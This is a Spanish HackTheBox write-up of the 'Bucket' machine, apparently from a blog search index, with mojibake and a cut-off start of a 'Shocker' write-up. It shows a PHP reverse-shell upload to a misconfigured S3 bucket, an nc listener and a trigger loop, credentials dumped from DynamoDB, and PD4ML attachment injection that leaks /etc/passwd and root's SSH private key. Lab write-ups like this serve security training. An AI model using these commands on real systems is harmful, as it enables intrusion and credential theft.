Ubuntu 4 (Ubuntu Linux; protocol 2. 0)80/tcp open http  Apache httpd 2. 4. 41|_http-server-header: Apache/2. 4. 41 (Ubuntu)|_http-title: Did not follow redirect to http://bucket. htb/Service Info: Host: 127. 0. 1. 1; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Wed Dec 23 25:25:25 2020 -- 1 IP address (1 host up) scanned in 22. 35 secondsTenemos:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 8. 2p1 Ubuntu 4       80   HTTP   Apache httpd 2. 4. 41   ‚Ä¶ Puerto 80 ‚åñ: A√±adimos el dominio bucket. htb a nuestro /etc/hosts. Por dos razones, en el reporte de nmap intenta hacer un redireccionamiento hacia ese dominio y si colocamos la IP en la web nos da error :P  Sobre el archivo /etc/hosts, en simples palabras sirve para relacionar/resolver los nombres de dominio con determinadas direcciones IP.  Data sobre el archivo /etc/hosts. ‚Äì¬ª cat /etc/hosts. . . 10. 10. 10. 212 bucket. htb. . . Tenemos: Nada en que fijarnos, revisando el c√≥digo fuente obtenemos otro dominio:  s3. bucket. htb, agregu√©moslo tambi√©n al /etc/hosts. ‚Äì¬ª cat /etc/hosts. . . 10. 10. 10. 212 bucket. htb s3. bucket. htb. . . Lo √∫nico que obtenemos es eso. Por lo que entiendo (seg√∫n la ruta que vimos en el c√≥digo fuente: s3. bucket. htb/adserver) estamos viendo el estado de un servidor de Ads (publicidad o anuncios). Por ahora no tenemos m√°s, intentemos hacer fuzzing sobre las dos webs a ver si encontramos algo (: El dominio s3. bucket. htb nos da la siguiente respuesta: ‚Äì¬ª dirsearch. py -u http://s3. bucket. htb/ -q200 -  2B - http://s3. bucket. htb/%2e%2e;/test200 -  2B - http://s3. bucket. htb/+CSCOE+/logon. html#form_title_text200 -  2B - http://s3. bucket. htb/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=. . &amp;resource-type=. . &amp;name=%2bCSCOE%2b/portal_inc. lua200 -  2B - http://s3. bucket. htb/+CSCOE+/session_password. html200 -  2B - http://s3. bucket. htb/+CSCOT+/translation-table?type=mst&amp;textdomain=/%2bCSCOE%2b/portal_inc. lua&amp;default-language&amp;lang=. . /200 -  54B - http://s3. bucket. htb/health500 - 290B - http://s3. bucket. htb/latest/meta-data/hostname403 - 278B - http://s3. bucket. htb/server-status200 -  0B - http://s3. bucket. htb/shell500 - 158B - http://s3. bucket. htb/shell. php500 - 158B - http://s3. bucket. htb/shell. aspx500 - 158B - http://s3. bucket. htb/shell. html500 - 158B - http://s3. bucket. htb/shell. jsp500 - 158B - http://s3. bucket. htb/shell. js500 - 158B - http://s3. bucket. htb/shell. sh500 - 158B - http://s3. bucket. htb/shellz. php500 - 158B - http://s3. bucket. htb/shell. asp500 - 158B - http://s3. bucket. htb/shell. htmSi revisamos shell, nos redirecciona a lo que parece ser un contenedor: http://s3. bucket. htb/shell -&gt; (redirecciona a) -&gt; http://444af250749d:4566/shell/Los dem√°s no nos muestran nada relevante‚Ä¶ La curiosidad me llevo a buscar s3 en la web, la respuesta: Amazon S3. Resumiendo: Almacenamiento de datos seguros en la web mediante Buckets ¬´nombre de la m√°quina (?)¬ª.  Amazon S3 es un servicio ampliamente usado por compa√±ias para guardar mediante buckets imagenes, estadisticas, recursos y cualquier objeto que pueda ayudar o necesitar la parte logica del negocio.  M√°s info ac√° y ac√° :P‚Ä¶ Explotaci√≥n #: Listos, leyendo sabemos que podemos subir archivos al bucket, siguiendo la gu√≠a oficial logramos instalar aws cli, nos apoyaremos de √©l para jugar con todo el entorno. Sabemos que podemos subir, borrar, actualizar y borrar objetos sobre el bucket. Por ejemplo para listar los objetos del bucket har√≠amos algo as√≠:  S3 Bucket Misconfigured Access Controls - Medium. com/BugBountyWriteup. ‚Äì¬ª aws s3 ls s3://s3. bucket. htb/(Nos pide que agreguemos unas credenciales v√°lidas :P, busque pero no encontr√©, as√≠ que puse cualquiera :P) Pero si recordamos la URL con la que llegamos ac√° fue http://s3. bucket. htb/adserver/images/ y ya sabiendo que estamos manejando buckets, lo m√°s seguro es que adserver sea uno de ellos. ‚Äì¬ª aws s3 ls s3://s3. bucket. htb/adserver/images/An error occurred (InvalidAccessKeyId) when calling the ListObjectsV2 operation: The AWS Access Key Id you provided does not exist in our records. El tema es que obtenemos un error con respecto al AccessKeyId ): Ac√° estuve full perdido, buscando y buscando, al l√≠mite del desespero :P pero sin resignarme encontr√© mi salvaci√≥n:  Working with localstack CLI - lobster1234/github. io. ‚Äì¬ª aws --endpoint-url=http://s3. bucket. htb s3 ls s3://adserver/images/2020-12-25 19:24:04   37840 bug. jpg2020-12-25 19:24:04   51485 cloud. png2020-12-25 19:24:04   16486 malware. pngPerfectoooooooooooooooooooooooo, intentemos subir un archivo: ‚Äì¬ª cat upupup. txt hola padreeeeeeeeeeeeeeee!!¬∑ ~/sec/htb/bucket/content ¬∑‚Äì¬ª aws --endpoint-url=http://s3. bucket. htb s3 cp upupup. txt s3://adserver/images/upload: . /upupup. txt to s3://adserver/images/upupup. txt     ¬∑ ~/sec/htb/bucket/content ¬∑‚Äì¬ª aws --endpoint-url=http://s3. bucket. htb s3 ls s3://adserver/images/2020-12-25 19:30:03   37840 bug. jpg2020-12-25 19:30:03   51485 cloud. png2020-12-25 19:30:03   16486 malware. png2020-12-25 19:31:01     28 upupup. txt Listos, el tema es que hay un limpiado de archivos super agresivo, lo cual nos da poco tiempo para revisar todo‚Ä¶ Intentando subir una reverse Shell o webshell no obtuve √©xito, lo √∫nico que me da respuesta es usar JavaScript, pero tampoco logre hacer mucho (o pues nada hasta el momento üòí). Retrocediendo un poco sobre la ruta /health nos dice que tenemos s3 y dynamodb corriendo (va tomando sentido lo que vamos encontrando): Si leemos la documentaci√≥n de aws tambi√©n tiene la opci√≥n de usar dynamodb, que nos permite crear tablas, listar las actuales, agregar √≠tems, entre otras cosas.  CLI Services DynamoDB - docs. aws/userguide.  CLI dynamodb - docs. aws/reference.  DynamoDB es una base de datos no relacional que ofrece rendimiento en milisegundos, es ofrecido por Amazon Web Services‚Ä¶ freecodecamp. org/basics-dynamodb Probemos a listar las tablas que existan: ‚Äì¬ª aws --endpoint-url=http://s3. bucket. htb dynamodb list-tablesTABLENAMES   ImageTABLENAMES   ImageTagTABLENAMES   usersOkaaaaaa, claramente nos llama la atenci√≥n la tabla users, usando el par√°metro scan podemos ver su contenido: ‚Äì¬ª aws --endpoint-url=http://s3. bucket. htb dynamodb scan --table-name usersNone  3    3PASSWORD    Management@#1@#USERNAME    MgmtPASSWORD    Welcome123!USERNAME    CloudadmPASSWORD    n2vM-&lt;_K_Q:. Aa2USERNAME    SysadmObtenemos unas credenciales, probablemente para migrar de usuarios estando dentro de la maquina. Por ahora los guardamos:       Username   Password         Mgmt   Management@#1@#       Cloudadm   Welcome123!       Sysadm   n2vM-&lt;_K_Q:. Aa2   Ac√° (como casi siempre) estuve full perdido ): Ya que nuestro objetivo inicial es subir un archivo que nos genere una reverse Shell, pero no entend√≠a como deb√≠a ser el proceso, as√≠ que prefer√≠ buscar ayuda. @TazWake me redirecciono y a la vez me ense√±o a pensar fuera de la caja (como le dice la gente): El tema es que la subida del archivo est√° perfecto, en nuestro caso subiremos el famoso reverse Shell de monkeypentest para que apenas lo ejecutemos obtengamos la Shell. Peeeeero ac√° es donde toca ‚Äútestear‚Äù o ‚Äúpensar fuera de la caja‚Äù, ya que si tenemos un servidor principal (http://bucket. htb/) y otro donde est√° el bucket (http://s3. bucket. htb/adserver/) podr√≠amos probar a subir el archivo y revisar el servidor por si tambi√©n de alguna forma se est√° guardando por ah√≠. As√≠ que si inicialmente subimos el archivo ejejerev. php, ya con nuestra IP y PUERTO modificado: ‚Äì¬ª aws --endpoint-url=http://s3. bucket. htb s3 cp ejejerev. php s3://adserver/images/upload: . /ejejerev. php to s3://adserver/images/ejejerev. phpNos ponemos en escucha, en mi caso por el puerto 4433: ‚Äì¬ª nc -nlvp 4433listening on [any] 4433 . . . Probamos desde consola hacer una petici√≥n hacia el archivo: ‚Äì¬ª curl -s http://s3. bucket. htb/adserver/images/ejejerev. php&lt;?php// php-reverse-shell - A Reverse Shell implementation in PHP// Copyright (C) 2007 pentestmonkey@pentestmonkey. net. . . Claramente no es ejecutado‚Ä¶ Pero ¬øY si probamos con el servidor principal? ‚Äì¬ª curl -s http://bucket. htb/adserver/images/ejejerev. php&lt;!DOCTYPE HTML PUBLIC  -//IETF//DTD HTML 2. 0//EN &gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Not Found&lt;/h1&gt;&lt;p&gt;The requested URL was not found on this server. &lt;/p&gt;&lt;hr&gt;&lt;address&gt;Apache/2. 4. 41 (Ubuntu) Server at bucket. htb Port 80&lt;/address&gt;&lt;/body&gt;&lt;/html&gt;Y con solo la carpeta /images/? ‚Äì¬ª curl -s http://bucket. htb/images/ejejerev. php Opa, intentamos un par de veces yyyyyyyy va pa i, obtenemos la Shell. Lecci√≥n aprendida, probar cosas que parezcan extra√±as. Entiendo que de alguna manera (quiz√°s en alg√∫n documento que no encontr√© se explica o se menciona ‚Äú‚Äù) temporalmente el servidor principal recoge lo que se est√° subiendo en el bucket para procesarlo o para‚Ä¶ Jmm, no sabr√≠a para qu√© realmente ): Lo mejor es hacer un script para evitar que se nos borren los archivos y no alcanzar a ejecutarlos (lo m√°s probable es que debamos ejecutarlo m√°s de 1 vez): #!/bin/bashfile_to_up=$1echo -e  \n[+] Uploading $file_to_up\n aws --endpoint-url=http://s3. bucket. htb/ s3 cp $file_to_up s3://adserver/images/echo -e  \n[+] Executing reverse shell. \n sleep 3for i in {1. . 10}; do curl -s -m 2 http://bucket. htb/images/$file_to_up &gt; /dev/null sleep 1doneBueno bueno, hagamos un tratamiento de la TTY apoyandonos de S4vitar. www-data@bucket:/$ ls /home/roywww-data@bucket:/$ cat /home/roy/user. txt cat: /home/roy/user. txt: Permission deniedwww-data@bucket:/$ Probemos migrarnos a roy con las contrase√±as que encontramos anteriormente:  Con la contrase√±a de: Sysadm - n2vM-&lt;_K_Q:. Aa2. ‚Ä¶ Escalada de privilegios #: Ahora si a enumerar. roy@bucket:~$ netstat -lActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address      Foreign Address     Statetcp    0   0 localhost:8000     0. 0. 0. 0:*        LISTENtcp    0   0 localhost:33447     0. 0. 0. 0:*        LISTENtcp    0   0 localhost:domain    0. 0. 0. 0:*        LISTENtcp    0   0 localhost:4566     0. 0. 0. 0:*        LISTENtcp    0   0 0. 0. 0. 0:ssh       0. 0. 0. 0:*        LISTEN. . . Haciendo Port Forwarding encontramos algo interesante en el puerto 8000: roy@bucket:~$ ssh -R 8000:localhost:8000 root@10. 10. 14. 218 Si enumeramos, encontramos el codigo fuente de esa pagina: roy@bucket:~$ cdroy@bucket:~$ cd /var/www/bucket-app/roy@bucket:/var/www/bucket-app$ ls -la total 856drwxr-x---+ 4 root root  4096 Sep 23 10:56 . drwxr-xr-x  4 root root  4096 Sep 21 12:28 . . -rw-r-x---+ 1 root root   63 Sep 23 02:23 composer. json-rw-r-x---+ 1 root root 20533 Sep 23 02:23 composer. lockdrwxr-x---+ 2 root root  4096 Jan 4 08:00 files-rwxr-x---+ 1 root root 17222 Sep 23 03:32 index. php-rwxr-x---+ 1 root root 808729 Jun 10 2020 pd4ml_demo. jardrwxr-x---+ 10 root root  4096 Sep 23 02:23 vendorroy@bucket:/var/www/bucket-app$ cat index. php | grep -i site -A 5  &lt;h1 class= advice__title &gt;Site under construction or maintenance &lt;/h1&gt;  &lt;p class= advice__description &gt;&lt;span&gt;&lt;&lt;/span&gt; Bucket Application &lt;span&gt;/&gt;&lt;/span&gt; not finished yet&lt;/p&gt; &lt;/section&gt; &lt;section class= city-stuff &gt;  &lt;ul class= skyscrappers__list &gt;   &lt;li class= skyscrapper__item skyscrapper-1 &gt;&lt;/li&gt;roy@bucket:/var/www/bucket-app$ Tenemos la estructura de la pagina y adem√°s que su propietario es el usuario root. Revisando el archivo index. php tenemos en su cabecera: roy@bucket:/var/www/bucket-app$ cat index. php | head -n 29&lt;?phprequire 'vendor/autoload. php';use Aws\DynamoDb\DynamoDbClient;if($_SERVER[ REQUEST_METHOD ]=== POST ) {    if($_POST[ action ]=== get_alerts ) {        date_default_timezone_set('America/New_York');        $client = new DynamoDbClient([            'profile' =&gt; 'default',            'region' =&gt; 'us-east-1',            'version' =&gt; 'latest',            'endpoint' =&gt; 'http://localhost:4566'        ]);        $iterator = $client-&gt;getIterator('Scan', array(            'TableName' =&gt; 'alerts',            'FilterExpression' =&gt;  title = :title ,            'ExpressionAttributeValues' =&gt; array( :title =&gt;array( S =&gt; Ransomware )),        ));        foreach ($iterator as $item) {            $name=rand(1,10000). '. html';            file_put_contents('files/'. $name,$item[ data ]);        }        passthru( java -Xmx512m -Djava. awt. headless=true -cp pd4ml_demo. jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result. pdf );    }}else{?&gt;Algo medio extra√±o‚Ä¶ Veamos de que se trata:  Si la petici√≥n que llega es un m√©todo POST y el atributo action es igual a get_alerts, Crea un objeto mediante DynamoDbClient con 4 argumentos, Para despu√©s hacer un scan (para ver el contenido de una tabla) a la tabla alerts, filtrando por el t√≠tulo Ransomware, Posteriormente genera un nombre random. html, extrae la data que obtuvo de la tabla y la guarda en el archivo files/random. html, Ahora con PD4ML genera un archivo . PDF tomando el archivo generado anteriormente, que est√° guardado en: /var/www/bucket-app/files/$name y guarda el resultado en la ruta files/result. pdf.  PD4ML es una herramienta generadora de archivos PDF que usa HTML y CSS para obtener el formato. De lo anterior podemos deducir que PD4ML al estar guardando una ruta absoluta, podemos pasarle la ruta del archivo root. txt o incluso la de la llave SSH privada del usuario root para despu√©s de leer el . PDF ingresar a la m√°quina con ella. ‚Ä¶ Bueno, pues si revisamos las tablas que existen mediante aws dynamodb tenemos: roy@bucket:/var/www/bucket-app$ aws --endpoint-url=http://localhost:4566 dynamodb list-tables{   TableNames : [     users   ]}roy@bucket:/var/www/bucket-app$ Procedamos a crear la tabla alerts agregando el t√≠tulo Ransomware: roy@bucket:/var/www/bucket-app$ aws --endpoint-url=http://localhost:4566 dynamodb --region us-east-1 create-table --table-name alerts \--attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S \--key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE \--provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5M√°s info sobre creaci√≥n y tablas:  Crear una tabla - docs. aws/developerguide.  Create a simple table in aws dynamodb - Medium. com/jerrythimothy.  Create table - docs. aws/reference.  Basic operations with tables, dynamodb - docs. amazonaws/developerguide.  Dynamodb CLI query examples - dynobase. dev. La respuesta de la ejecuci√≥n es la siguiente: {   TableDescription : {     AttributeDefinitions : [      {         AttributeName :  title ,         AttributeType :  S       },      {         AttributeName :  data ,         AttributeType :  S       }    ],     TableName :  alerts ,     KeySchema : [      {         AttributeName :  title ,         KeyType :  HASH       },      {         AttributeName :  data ,         KeyType :  RANGE       }    ],     TableStatus :  ACTIVE ,     CreationDateTime : 1609778713. 466,     ProvisionedThroughput : {       LastIncreaseDateTime : 0. 0,       LastDecreaseDateTime : 0. 0,       NumberOfDecreasesToday : 0,       ReadCapacityUnits : 10,       WriteCapacityUnits : 5    },     TableSizeBytes : 0,     ItemCount : 0,     TableArn :  arn:aws:dynamodb:us-east-1:000000000000:table/alerts   }}Validamos: roy@bucket:/var/www/bucket-app$ aws --endpoint-url=http://localhost:4566 dynamodb list-tables{   TableNames : [     alerts ,     users   ]}Y el contenido: roy@bucket:/var/www/bucket-app$ aws --endpoint-url=http://localhost:4566 dynamodb scan --table-name alerts{   Items : [],   Count : 0,   ScannedCount : 0,   ConsumedCapacity : null}La tabla es borrada en pocos segundos, as√≠ que debemos trabajar r√°pido‚Ä¶ Agregamos data dentro de la tabla:  Using bash and aws CLI to interact with tables - blog. ruanbekker. com. roy@bucket:/var/www/bucket-app$ aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts \--item '{ Title : { S :  Ransomware },  data : { S :  /etc/passwd }}'{   ConsumedCapacity : {     TableName :  alerts ,     CapacityUnits : 1. 0  }}Validamos el contenido ahora: roy@bucket:/var/www/bucket-app$ aws --endpoint-url=http://localhost:4566 dynamodb scan --table-name alerts{   Items : [    {       title : {         S :  Ransomware       },       data : {         S :  /etc/passwd       }    }  ],   Count : 1,   ScannedCount : 1,   ConsumedCapacity : null}Ahora nos quedaria realizar la petici√≥n cURL con el metodo POST y el atributo action: roy@bucket:/var/www/bucket-app$ curl -X POST --data  action=get_alerts  http://localhost:8000/index. phpObtenemos el archivo result. pdf: roy@bucket:/var/www/bucket-app$ cd filesroy@bucket:/var/www/bucket-app/files$ ls -latotal 12drwxr-x---+ 2 root root 4096 Jan 5 02:23 . drwxr-x---+ 4 root root 4096 Sep 23 10:56 . . -rw-r--r-- 1 root root 1633 Jan 5 02:23 result. pdfroy@bucket:/var/www/bucket-app/files$ cat result. pdf%PDF-1. 4%1 0 obj% [24]&lt;&lt;/Filter /FlateDecode. . . Pero entre toda la data no vemos nada relacionado con el archivo /etc/passwd. Ac√° estuve un buen tiempo atascado, as√≠ que recurr√≠ de nuevo a @TazWake que me dio una mano con una p√°gina donde indica que PD4ML soporta archivos adjuntos mediante el tag: &lt;pd4ml:attachment&gt;, lo que nos permite adjuntar un archivo para ver o listar el contenido del mismo :P  PDF Attachments - pd4ml. com. Lo curioso fue que despu√©s de un rato de jugar con esto encontr√© un tweet donde se hablaba de este descubrimiento y como explotarlo:  Playing with PD4ML API - twitter. com/akhilreni_hs. &lt;pd4ml:attachment description= attached. txt  icon= PushPin &gt;file:///etc/passwd&lt;/pd4ml:attachment&gt;Listo, pues intentemos agregar esta l√≠nea a la fila data de nuestra tabla y ejecutamos la petici√≥n con cURL a ver que sucede: roy@bucket:/var/www/bucket-app$ aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts \--item '{ title : { S :  Ransomware },  data : { S :  &lt;pd4ml:attachment description=\ attached. txt\  icon=\ PushPin\ &gt;file:///etc/passwd&lt;/pd4ml:attachment&gt; }}'Escapamos las    (comillas) y le damos: roy@bucket:/var/www/bucket-app/files$ curl -X POST --data  action=get_alerts  http://localhost:8000/index. phproy@bucket:/var/www/bucket-app/files$ cat result. pdf%PDF-1. 4%1 0 obj% [24] &lt;&lt;/Filter /FlateDecode. . . . . . /Params 5 0 R&gt;&gt;streamroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/sync. . . lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falsednsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinroy:x:1000:1000:,,,:/home/roy:/bin/bash. . . Perfectooooooooooooooooooo, tenemos la estructura del archivo /etc/passwd en nuestro resultado. Probemos a ver si el usuario root tiene llave privada en su $HOME: &lt;pd4ml:attachment description= attached. txt  icon= PushPin &gt;file:///root/. ssh/id_rsa&lt;/pd4ml:attachment&gt;roy@bucket:/var/www/bucket-app/files$ aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts \--item '{ title : { S :  Ransomware },  data : { S :  &lt;pd4ml:attachment description=\ attached. txt\  icon=\ PushPin\ &gt;file:///root/. ssh/id_rsa&lt;/pd4ml:attachment&gt; }}'{   ConsumedCapacity : {     TableName :  alerts ,     CapacityUnits : 1. 0  }}roy@bucket:/var/www/bucket-app/files$ curl -X POST --data  action=get_alerts  http://localhost:8000/index. phproy@bucket:/var/www/bucket-app/files$ cat result. pdf %PDF-1. 4%1 0 obj% [24] &lt;&lt;/Filter /FlateDecode/Length 397&gt;&gt;stream. . . /Length 2602/Params 5 0 R&gt;&gt;stream-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAx6VphKMyxurjldmb6dy1OSn0D9dumFAUCeSoICwhhsq+fadx21SUbQr/unofKrmgNMAhjmrHCiMapmDw1dcyj4PSPtwo6IvrV0Guyu34Law1Eav9sV1hgzDLm89tAB7fh2JN8OB/4dt0sWxHxzWfCmHF5DBWSlxdk+K4H2vJ+eTA2FxT2teLPmJd7G9mvanh1VtctpCOi6+CMcv1IMvdFtBLbieffTAOF1rSJds4m00MpqqwDiQdgN5ghcOubTXi3cbjz9uCTBtXO2dcLfHAqhqYSa7eM0x5pwX54Hr9SP0qJp5y0ueraiOdoSJD5SmgBfIfCzUDZAMnde3YGZ0Q4a86BVgsD2Vl54+9hoLOYMsiV9g4S76+PmBiuwi/Wrxtoyzr3/htJVmCpm+WfOr4QQZyCFAVo21sLfIqMcPBqlur5FvrWtUUCA0usfx/j40V/l5WAIioIOX0XmX0kll1f6P71+d/BXAQNvyt/aOennafgvzsj23w5m4sOTBNOgBlAAAFiC6rIUsuqyFLAAAAB3NzaC1yc2EAAAGBAMelaYSjMsbq45XZm+nctTkp9A/XbphQFAnkqCAsIYbKvn2ncdtUlG0K/7p6Hyq5oDTAIY5qxwojGqZg8NXXMo+D0j7cKOiL61dBrsrt+C2sNRGr/bFdYYMwy5vPbQAe34diTfDgf+HbdLFsR8c1nwphxeQwVkpcXZPiuB9ryfnkwNhcU9rXiz5iXexvZr2p4dVbXLaQjouvgjHL9SDL3RbQS24nn30wDhda0iXbOJtNDKaqsA4kHYDeYIXDrm014t3G48/bgkwbVztnXC. . . La copiamos, guardamos en un archivo, le damos los permisos necesarios: chmod 700 keyroot e intentamos ingresar mediante SSH: OPAAAAAAAAAAAAAAa tamos dentro compita (: Solo nos quedar√≠an por ver las flags: ‚Ä¶ Nota:  Como vimos lo que explotamos no fue la ruta absoluta que hab√≠a comentado que probablemente podr√≠amos cambiar, sino que nos aprovechamos de un feature de la herramienta y de un proceso que llama la herramienta. Ya que el archivo index. php lee el contenido de la tabla y extrae la fila data para guardarla en un archivo, de ese archivo es que se genera el PDF (: Muy lindo la verdad. ‚Ä¶ En resumen, el proceso para ver el contenido de la bandera del usuario root ser√≠a algo as√≠ plasmado en un script (ya que la tabla es borrada en pocos segundos): #!/bin/bash#Create table `alerts`aws --endpoint-url=http://localhost:4566 dynamodb --region us-east-1 create-table --table-name alerts \    --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S \    --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE \    --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5#Validate creationaws --endpoint-url=http://localhost:4566 dynamodb list-tables#Add data to the tableaws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts \    --item '{ title : { S :  Ransomware },  data : { S :  &lt;pd4ml:attachment description=\ attached. txt\  icon=\ PushPin\ &gt;file:///root/root. txt&lt;/pd4ml:attachment&gt; }}'#Validate data inside tableaws --endpoint-url=http://localhost:4566 dynamodb scan --table-name alerts#Generate PDFcurl -X POST --data  action=get_alerts  http://localhost:8000/index. php#Read `result. pdf`cat /var/www/bucket-app/files/result. pdf‚Ä¶ Es todo por esta m√°quina. Muy linda y entretenida, como casi siempre hay momentos en los que me s√∫per pierdo, pero bueno de eso se trata, aprender de todos los tropiezos. El privesc me pareci√≥ muy loco‚Ä¶ Pero muy original y a la vez que miedito, todo lo que puede causar un archivo con inputs :P Por ahora no es m√°s, nos leeremos en otra ocasi√≥n, gracias por leer y espero les haya servido. A seguir rompiendo todo üòä "
    }, {
    "id": 55,
    "url": "http://localhost:4000/htb/shocker",
    "title": "HackTheBox - Shocker",
    "body": "2021/04/22 - M√°quina Linux nivel f√°cil, nos dar√° un shock (?) al encontrarnos la vulnerabilidad Shellshock (muy linda) y lograr ejecutar comandos en el sistema. Despu√©s jugando con los permisos de usuario podremos obtener una sesi√≥n como root explotando el binario Perl.  TL;DR (Spanish writeup): Creada por: mrb3n. HOLAAAAAAAAAAAA e. e Bueno, ser√° una ruta sencilla y acogedora :3 Nos encontraremos un servicio web el cual tiene el directorio cgi-bin y dentro un archivo user. sh, indagando veremos que podemos relacionar lo encontrado con una vulnerabilidad llamada Shellshock, jugando con ella lograremos ejecutar comandos en el sistema como el usuario shelly, lo usaremos para entablarnos una reverse Shell. Estando dentro y validando los permisos que tenemos como shelly ante otros usuarios (sudo -l), veremos que podemos ejecutar el binario /usr/bin/perl como el usuario root, con la ayuda del repositorio GTFOBins (e internet :P) lograremos obtener una (dos, tres, las que quieras) Shell como root en la m√°quina (: Clasificaci√≥n de la m√°quina:  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶ ¬øKhe vamo hace‚Äô? ü§î  Enumeraci√≥n.  Explotaci√≥n.  Escalada de privilegios. ‚Ä¶ Enumeraci√≥n #: Realizamos nuestro escaneo de puertos para saber que servicios est√° corriendo la m√°quina: ‚ù≠ nmap -p- --open -v 10. 10. 10. 56 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   ‚ù≠ cat initScan ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ    ‚îÇ File: initScan‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ  1  ‚îÇ # Nmap 7. 80 scan initiated Thu Apr 22 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 56  2  ‚îÇ # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)  3  ‚îÇ Host: 10. 10. 10. 56 ()  Status: Up  4  ‚îÇ Host: 10. 10. 10. 56 ()  Ports: 80/open/tcp//http///, 2222/open/tcp//EtherNetIP-1///  5  ‚îÇ # Nmap done at Thu Apr 22 25:25:25 2021 -- 1 IP address (1 host up) scanned in 163. 27 